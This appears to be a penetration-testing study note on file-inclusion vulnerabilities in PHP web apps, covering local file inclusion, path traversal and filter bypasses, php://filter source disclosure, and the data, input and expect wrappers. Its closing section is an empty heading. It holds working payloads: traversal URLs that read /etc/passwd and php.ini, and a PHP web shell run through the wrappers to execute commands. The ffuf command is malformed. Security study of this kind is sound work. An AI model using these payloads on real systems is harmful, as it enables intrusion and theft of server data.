# File Inclusion

1. [Intro to File Inclusions](#intro-to-file-inclusions)
1. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
1. [Basic Bypasses](#basic-bypasses)
1. [PHP Filters](#php-filters)
1. [PHP Wrappers](#php-wrappers)
1. [Remote File Inclusion](#remote-file-inclusion)

## Intro to File Inclusions

* If functionalities such as ```HTTP parameters``` are not securely coded, an attacker can manipulate them to display contents of local files on the hosting server, leading to a ```LFI (Local File Inclusion)``` vulnerability.

* ```LFI``` vulnerabilities can lead to source code disclosure, sensitive data exposure and even remote code execution.

* These vulnerabilities can occur in popular web servers & development frameworks such as ```PHP```, ```NodeJS```, ```Java``` and ```.Net```.

* List of functions which may read content and/or execute files:

| **Function**             | **Read Content** | **Execute** | **Remote URL** |
|--------------------------|------------------|-------------|----------------|
| **_PHP_**                |                  |             |                |
| include()/include_once() | Yes              | Yes         | Yes            |
| require()/require_once() | Yes              | Yes         | No             |
| file_get_contents()      | Yes              | No          | Yes            |
| fopen()/file()           | Yes              | No          | No             |
| **_NodeJS_**             |                  |             |                |
| fs.readFile()            | Yes              | No          | No             |
| fs.sendFile()            | Yes              | No          | No             |
| res.render()             | Yes              | Yes         | No             |
| **_Java_**               |                  |             |                |
| include                  | Yes              | No          | No             |
| import                   | Yes              | Yes         | Yes            |
| **_.NET_**               |                  |             |                |
| @Html.Partial()          | Yes              | No          | No             |
| @Html.RemotePartial()    | Yes              | No          | Yes            |
| Response.WriteFile()     | Yes              | No          | No             |
| include                  | Yes              | Yes         | Yes            |

## Local File Inclusion (LFI)

* Basic LFI:

  * For the given example, it is changing the language of the page by modifying the ```language``` parameter in URL - it is pulling a local file:

    ```http://<server_ip>:<port>/index.php?language=es.php```

  * We can change the file being pulled to read a different local file. For example, if the server is running Linux:

    ```http://<server_ip>:<port>/index.php?language=/etc/passwd```

* Path traversal:

  * In previous example, we read the file by specifying absolute path - this works if the input was fetched using this function:

    ```php
    include($_GET['language']);
    ```

  * However, this method would not work if the file is being read from a directory:

    ```php
    include("./languages/" . $_GET['language']);
    ```

  * In this case, we will have to traverse directories by using relative paths - for example, if the full path of the current directory is ```/var/www/html/languages```:

    ```http://<server_ip>:<port>/index.php?language=../../../../etc/passwd```

* Filename prefix:

  * It's possible that input can be appended to a different string to get full filename:

    ```php
    include("lang_" . $_GET['language']);
    ```

  * Here, we cannot use relative path directly - we will have to prefix a ```/``` before our payload (to consider it as a directory):

    ```http://<server_ip>:<port>/index.php?language=/../../../etc/passwd```

* Appended extensions:

  * An extension can also be mapped to the input parameter:

    ```php
    include($_GET['language'] . ".php");
    ```

  * In this case, we cannot read ```/etc/passwd``` using the above methods.

* Second-order attacks:

  * Refers to poisoning a database entry with a malicious LFI payload from user input (such as username)

## Basic Bypasses

* Non-recursive path traversal filters:

  * A basic LFI filter is search-and-replace - simply deletes substrings of ```../``` to avoid path traversals:

    ```php
    $language = str_replace('../', '', $_GET['language']);
    ```

  * This filter is insecure, as it does not recursively remove the ```../``` substring - to bypass this we can use ```....//``` as part of payload:
  
    ```http://<server_ip>:<port>/index.php?language=....//....//....//....//etc/passwd```

  * Other similar bypasses include using payloads like ```..././```, ```....\/```, ```....////```, etc.

* Encoding:

  * Web input filters can prevent certain chars like ```.``` or ```/``` - however, we can bypass some of these by URL encoding our input.

  * For instance, ```../``` upon URL encoding gives ```%2e%2e%2f``` - we can similarly encode the whole payload; a double encoding can also be done if needed.

* Approved paths:

  * Regex can be used to check file included is under a specific path:

    ```php
    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
    } else {
    echo 'Illegal path specified!';
    }
    # only accepts path under ./languages directory
    ```
  
  * To find the approved path, we can examine the requests sent by the forms, and see what path they use for normal functionality - we can also fuzz web directories under the same path.

  * Once found, to bypass it we can use path traversal by starting payload with approved path:

    ```http://<server_ip>:<port>/index.php?language=./languages/../../../../../etc/passwd```

* Appended extension:

  * Web apps can also append an extension like ```.php``` to input string - we may not be able to bypass this in PHP versions after 5.3/5.4.

  * Path truncation:

    * In earlier versions of PHP, defined strings have max length of 4096 chars - if longer string is passed, it is truncated.

    * Also, PHP used to remove trailing slashes & dots like ```/.``` and ```////``` from path names.

    * We can combine these to create long string evaluating to a correct path (can be created with command) - but we need to start the path with a non-existing directory:

      ```http://<server_ip>:<port>/index.php?language=non-existent-dir/../../../etc/passwd/././././.[/. repeated ~2048 times]```

      ```shell
      echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
      ```

  * Null bytes:

    * PHP versions before 5.5 were vulnerable to ```null byte injection``` - adding null byte ```%00``` to end of string would terminate it:

      ```http://<server_ip>:<port>/index.php?language=../../../../etc/passwd%00```

## PHP Filters

* Input Filters:

  * PHP filters (```php://filter/```) are a type of PHP wrappers (```php:// streams```), in which we can pass input and get it filtered by the filter specified.

  * It has many parameters, but the ones we need are ```resource``` & ```read```; there are filter types like Conversion and Encryption as well.

* Fuzzing for PHP files:

  * Fuzz for available PHP pages using tools like ```ffuf``` or ```gobuster```:

    ```shell
    ffuf - /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<server_ip>:<port>/FUZZ.php
    ```

  * We can read the source code of identified files, and scan them for other referenced PHP files as well.

* Standard PHP inclusion:

  * If we try to include any PHP files via LFI, the included file gets executed and rendered as a normal HTML page. For example, ```config.php``` is included (.php extension appended by web app):

    ```http://<server_ip>:<port>/index.php?language=config```
  
  * While this can be useful, viewing the source code is a more useful option - for this we need to use the ```base64``` PHP filter.

* Source code disclosure:

  * Required PHP filter for reading source code of (example) ```config.php``` (if .php is not added automatically by web app, we will need to append that):

    ```php
    php://filter/read=convert.base64-encode/resource=config
    ```

    ```http://<server_ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=config```
  
  * We can then use ```echo <encoded string> | base64 -d``` command to decode & get source code.

## PHP Wrappers

* Data:

  * The ```data``` wrapper can be used to include external data (including PHP code) - however it is only available to use if ```allow_url_include``` is enabled in PHP config.

  * To check this, we can include PHP config file found at ```/etc/php/X.Y/apache2/php.ini``` for Apache or at ```/etc/php/X.Y/fpm/php.ini``` for Nginx, where X.Y is the PHP version:

    ```shell
    curl "http://<server_ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    
    echo 'base64-encoded string ...' | base64 -d | grep allow_url_include
    ```

  * Now, for the ```data``` wrapper attack, we can pass base64-encoded string - the filter can decode it and execute PHP code. For example, we can get a basic PHP web shell encoded:

    ```shell
    echo '<?php system($_GET["cmd"]); ?>' | base64
    ```
  
  * Then, we can URL-encode the base64 string & pass it to the ```data``` wrapper - commands can be passed with the ```cmd``` parameter:

    ```shell
    curl -s 'http://<server_ip>:<port>/index.php?language=data://text/plain;base64,<url-encoded base64-encoded web shell>&cmd=id' | grep uid
    # we can view this in browser too
    ```

* Input:

  * The ```input``` wrapper can also be used to include external input (as POST request) & execute PHP code - this also needs the ```allow_url_include``` setting to be enabled.

  * We can send a POST request & add our web shell:

    ```shell
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
    ```

* Expect:

  * ```expect``` wrapper allows us to directly run commands through URL streams - no need to provide web shell in this case, as it is designed to execute commands.

  * As ```expect``` is an external wrapper, it needs to be manually installed & enabled on the back-end server - we can check if it is there or not (similar to how we check for ```allow_url_include```):

    ```shell
    curl "http://<server_ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    
    echo 'base64-encoded string ...' | base64 -d | grep expect
    ```

  * To get RCE with ```expect```:

    ```shell
    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
    ```

## Remote File Inclusion
